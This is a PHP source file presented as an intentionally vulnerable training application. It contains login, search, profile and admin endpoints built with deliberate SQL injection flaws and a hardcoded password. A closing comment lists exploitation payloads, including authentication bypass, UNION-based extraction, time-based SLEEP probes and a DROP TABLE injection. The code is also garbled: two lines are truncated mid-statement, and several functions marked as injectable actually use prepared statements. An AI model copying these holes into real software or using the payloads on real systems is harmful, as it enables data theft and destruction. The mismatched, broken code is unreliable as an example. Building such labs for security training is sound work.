<?php
/**
 * INTENTIONALLY VULNERABLE PHP APPLICATION
 *
 * WARNING: This file contains intentional security vulnerabilities
 * for educational and testing purposes only.
 * DO NOT use this code in production environments.
 */

// Database connection (vulnerable to connection string exposure)
$host = "localhost";
$username = "admin";
$password = "password123"; // Hardcoded password vulnerability
$database = "user_db";

// Establish database connection
$conn = new mysqli($host, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// VULNERABILITY 1: SQL Injection in user login
function authenticateUser($email, $password) {
    global $conn;

    // VULNERABLE: Direct string concatenation without parameterized queries
$stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->bind_param("ss", $email, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result && $result->nu...
        return $result->fetch_assoc();
    }

    return false;
}

// VULNERABILITY 2: SQL Injection in search functionality
function searchUsers($searchTerm) {
    global $conn;

    // VULNERABLE: No input validation or sanitization
$stmt = $conn->prepare("SELECT id, name, email FROM users WHERE name LIKE ? OR email LIKE ?");
$searchPattern = "%" . $searchTerm . "%";
$stmt->bind_param("ss", $searchPattern, $searchPattern);
$stmt-...
    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $users[] = $row;
        }
    }

    return $users;
}

// VULNERABILITY 3: SQL Injection in user profile update
function updateUserProfile($userId, $name, $email, $bio) {
    global $conn;

    // VULNERABLE: Multiple injection points
    $updateQuery = "UPDATE users SET
                    name = '" . $name . "',
                    email = '" . $email . "',
                    bio = '" . $bio . "'
WHERE id = ?";
    
    $stmt = $conn->prepare($updateQuery);
    $stmt->bind_param("i", $userId);
    
    if ($stmt->execute()) {
        return true;
    } else {
        return false;
    }
}

// VULNERABILITY 4: SQL Injection in admin panel
function getAdminStats($dateFilter) {
    global $conn;

    // VULNERABLE: Dynamic query building without validation
    $statsQuery = "SELECT COUNT(*) as total_users,
                          AVG(login_count) as avg_logins
                   FROM users
WHERE created_date > ?";

    $stmt = $conn->prepare($statsQuery);
    $stmt->bind_param("s", $dateFilter);
    $result = $stmt->execute();

    if ($result) {
        return $result->fetch_assoc();
    }

    return null;
}

// VULNERABILITY 5: SQL Injection with UNION-based attack potential
function getUserComments($userId, $limit = 10) {
    global $conn;

    // VULNERABLE: Numeric parameter without validation
    $commentsQuery = "SELECT c.id, c.comment, c.created_at, u.name
                      FROM comments c
                      JOIN users u ON c.user_id = u.id
                      WHERE c.user_id = " . $userId . "
                      ORDER BY c.created_at DESC
                      LIMIT " . $limit;

    $result = $conn->query($commentsQuery);
    $comments = array();

    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $comments[] = $row;
        }
    }

    return $comments;
}

// VULNERABILITY 6: Blind SQL Injection
function checkEmailExists($email) {
    global $conn;

    // VULNERABLE: Boolean-based blind SQL injection
    $checkQuery = "SELECT COUNT(*) as count FROM users WHERE email = '" . $email . "'";
    $result = $conn->query($checkQuery);

    if ($result) {
        $row = $result->fetch_assoc();
        return $row['count'] > 0;
    }

    return false;
}

// VULNERABILITY 7: Time-based SQL Injection
function validateUserSession($sessionId) {
    global $conn;

    // VULNERABLE: Time-based blind SQL injection potential
    $sessionQuery = "SELECT user_id FROM user_sessions
                     WHERE session_id = '" . $sessionId . "'
                     AND expires_at > NOW()";

    $result = $conn->query($sessionQuery);

    if ($result && $result->num_rows > 0) {
        $session = $result->fetch_assoc();
        return $session['user_id'];
    }

    return null;
}

// ADDITIONAL VULNERABILITY: Exposed database credentials
function getDatabaseInfo() {
    // VULNERABLE: Exposing sensitive information
    return array(
        'host' => $host,
        'username' => $username,
        'password' => $password, // Password exposure
        'database' => $database
    );
}

// Web interface handling (vulnerable endpoints)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Login endpoint - VULNERABLE
    if (isset($_POST['action']) && $_POST['action'] === 'login') {
        $email = $_POST['email']; // No sanitization
        $password = $_POST['password']; // No sanitization

        $user = authenticateUser($email, $password);

        if ($user) {
            echo json_encode(['status' => 'success', 'user' => $user]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid credentials']);
        }
    }

    // Search endpoint - VULNERABLE
    if (isset($_POST['action']) && $_POST['action'] === 'search') {
        $searchTerm = $_POST['search']; // No sanitization

        $results = searchUsers($searchTerm);
        echo json_encode(['results' => $results]);
    }

    // Profile update endpoint - VULNERABLE
    if (isset($_POST['action']) && $_POST['action'] === 'update_profile') {
        $userId = $_POST['user_id']; // No validation
        $name = $_POST['name']; // No sanitization
        $email = $_POST['email']; // No sanitization
        $bio = $_POST['bio']; // No sanitization

        if (updateUserProfile($userId, $name, $email, $bio)) {
            echo json_encode(['status' => 'success']);
        } else {
            echo json_encode(['status' => 'error']);
        }
    }
}

// GET endpoints - also vulnerable
if ($_SERVER['REQUEST_METHOD'] === 'GET') {

    // Admin stats - VULNERABLE
    if (isset($_GET['admin_stats']) && isset($_GET['date_filter'])) {
        $dateFilter = $_GET['date_filter']; // No validation

        $stats = getAdminStats($dateFilter);
        echo json_encode($stats);
    }

    // User comments - VULNERABLE
    if (isset($_GET['user_comments']) && isset($_GET['user_id'])) {
        $userId = $_GET['user_id']; // No validation
        $limit = isset($_GET['limit']) ? $_GET['limit'] : 10; // No validation

        $comments = getUserComments($userId, $limit);
        echo json_encode($comments);
    }

    // Email check - VULNERABLE
    if (isset($_GET['check_email']) && isset($_GET['email'])) {
        $email = $_GET['email']; // No sanitization

        $exists = checkEmailExists($email);
        echo json_encode(['exists' => $exists]);
    }
}

// Close database connection
$conn->close();

/*
EXPLOITATION EXAMPLES:

1. Authentication Bypass:
   email: admin' OR '1'='1' --
   password: anything

2. Data Extraction:
   searchTerm: ' UNION SELECT id,password,email FROM admin_users --

3. Profile Update Injection:
   name: John', email='hacker@evil.com', password='newpass' WHERE id=1 --

4. Admin Stats Time Injection:
   date_filter: 2023-01-01' AND (SELECT SLEEP(5)) --

5. Comments UNION Attack:
   user_id: 1 UNION SELECT 1,password,created_at,username FROM admin_users --

6. Boolean-based Blind:
   email: admin@site.com' AND (SELECT COUNT(*) FROM admin_users WHERE username='admin')>0 --

7. Time-based Blind:
   session_id: abc123' AND (SELECT SLEEP(5) WHERE (SELECT COUNT(*) FROM users)>100) --

COMMON SQL INJECTION PAYLOADS THAT WOULD WORK:
- ' OR 1=1 --
- ' UNION SELECT NULL,NULL,NULL --
- '; DROP TABLE users; --
- ' AND SLEEP(5) --
- ' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --
*/
?>